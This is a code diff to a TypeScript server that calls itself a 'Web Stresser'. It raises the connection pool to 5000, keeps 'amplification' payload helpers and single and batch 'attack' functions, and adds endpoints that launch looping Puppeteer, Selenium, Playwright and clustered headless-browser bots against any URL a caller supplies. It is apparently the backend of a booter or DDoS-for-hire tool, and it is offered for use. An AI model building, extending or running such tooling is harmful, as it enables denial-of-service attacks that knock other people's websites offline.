@@ -1,15 +1,28 @@
 import { Elysia, t } from 'elysia';
 import { setGlobalDispatcher, Agent } from 'undici';
+import { runPuppeteerBot } from '../bots/puppeteerBot.js';
+import { runSeleniumBot } from '../bots/seleniumBot.js';
+import { runPlaywrightBot } from '../bots/playwrightBot.js';
+import { runClusterBot } from '../bots/clusterBot.js';
 
-// Global dispatcher untuk koneksi keep-alive masif
 const globalAgent = new Agent({
-  connections: 2000,
+  connections: 5000,
   pipelining: 1,
   keepAliveTimeout: 60000,
   keepAliveMaxTimeout: 60000,
 });
 setGlobalDispatcher(globalAgent);
 
+// Active users counter
+const activeUsers = new Map<string, number>();
+setInterval(() => {
+  const now = Date.now();
+  for (const [key, timestamp] of activeUsers.entries()) {
+    if (now - timestamp > 60000) activeUsers.delete(key);
+  }
+}, 30000);
+
+// Amplification helpers
 function randomString(n: number): string {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   let result = '';
@@ -24,15 +37,7 @@ function generateAmplificationPayload(kb: number, ampType: string): string {
   return 'X'.repeat(size);
 }
 
-// Active users counter
-const activeUsers = new Map<string, number>();
-setInterval(() => {
-  const now = Date.now();
-  for (const [key, timestamp] of activeUsers.entries()) {
-    if (now - timestamp > 60000) activeUsers.delete(key);
-  }
-}, 30000);
-
+// Single attack (HTTP/HTTPS)
 interface SingleAttackParams {
   url: string;
   method: string;
@@ -167,6 +172,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   };
 }
 
+// Batch attack (HTTP/HTTPS masif)
 interface BatchAttackParams {
   url: string;
   method: string;
@@ -263,6 +269,16 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
   };
 }
 
+// Bot endpoints
+interface BotOptions {
+  url: string;
+  loop: boolean;
+  intervalMs: number;
+  headless: boolean;
+  concurrency: number;
+  totalTasks: number;
+}
+
 export const app = new Elysia()
   .onError(({ error, set }) => {
     set.status = 200;
@@ -270,24 +286,12 @@ export const app = new Elysia()
     return { success: false, error: error.message };
   })
   .onAfterHandle(({ set }) => {
-    // HTTP/3 hint untuk browser (QUIC)
     set.headers['Alt-Svc'] = 'h3=":443"; ma=86400';
-  })
-  .onBeforeHandle(({ request }) => {
-    if (request.method === 'OPTIONS') {
-      return new Response(null, {
-        headers: {
-          'Access-Control-Allow-Origin': '*',
-          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-          'Access-Control-Allow-Headers': 'Content-Type',
-        },
-      });
-    }
   })
   .get('/api/status', () => ({
     status: 'ok',
-    message: 'Web Stresser Ultimate - HTTP/3 + QUIC Flood Mode',
-    version: '16.0.0',
+    message: 'Web Stresser Extreme - Full Browser Bot Army',
+    version: '17.0.0',
   }))
   .post('/api/attack', async ({ body }) => {
     try {
@@ -337,6 +341,75 @@ export const app = new Elysia()
       total: t.Number(),
       continuous: t.Boolean(),
       intervalMs: t.Number(),
+    }),
+  })
+  // Puppeteer Bot endpoint
+  .post('/api/bot/puppeteer', async ({ body }) => {
+    try {
+      const { url, loop, intervalMs, headless } = body as BotOptions;
+      // Jalankan sebagai background task (tidak menunggu selesai)
+      runPuppeteerBot(url, { loop, intervalMs, headless }).catch(console.error);
+      return { success: true, message: 'Puppeteer bot started' };
+    } catch (err: any) {
+      return { success: false, error: err.message };
+    }
+  }, {
+    body: t.Object({
+      url: t.String(),
+      loop: t.Boolean(),
+      intervalMs: t.Number(),
+      headless: t.Boolean(),
+    }),
+  })
+  // Selenium Bot endpoint
+  .post('/api/bot/selenium', async ({ body }) => {
+    try {
+      const { url, loop, intervalMs, headless } = body as BotOptions;
+      runSeleniumBot(url, { loop, intervalMs, headless }).catch(console.error);
+      return { success: true, message: 'Selenium bot started' };
+    } catch (err: any) {
+      return { success: false, error: err.message };
+    }
+  }, {
+    body: t.Object({
+      url: t.String(),
+      loop: t.Boolean(),
+      intervalMs: t.Number(),
+      headless: t.Boolean(),
+    }),
+  })
+  // Playwright Bot endpoint
+  .post('/api/bot/playwright', async ({ body }) => {
+    try {
+      const { url, loop, intervalMs, headless } = body as BotOptions;
+      runPlaywrightBot(url, { loop, intervalMs, headless }).catch(console.error);
+      return { success: true, message: 'Playwright bot started' };
+    } catch (err: any) {
+      return { success: false, error: err.message };
+    }
+  }, {
+    body: t.Object({
+      url: t.String(),
+      loop: t.Boolean(),
+      intervalMs: t.Number(),
+      headless: t.Boolean(),
+    }),
+  })
+  // Puppeteer Cluster Bot endpoint (massive parallel browser)
+  .post('/api/bot/cluster', async ({ body }) => {
+    try {
+      const { url, concurrency, totalTasks, loop } = body as BotOptions;
+      runClusterBot(url, { concurrency: concurrency || 10, totalTasks: totalTasks || 100, loop }).catch(console.error);
+      return { success: true, message: 'Puppeteer Cluster bot started' };
+    } catch (err: any) {
+      return { success: false, error: err.message };
+    }
+  }, {
+    body: t.Object({
+      url: t.String(),
+      concurrency: t.Number(),
+      totalTasks: t.Number(),
+      loop: t.Boolean(),
     }),
   })
   .get('/api/heartbeat', ({ request }) => {
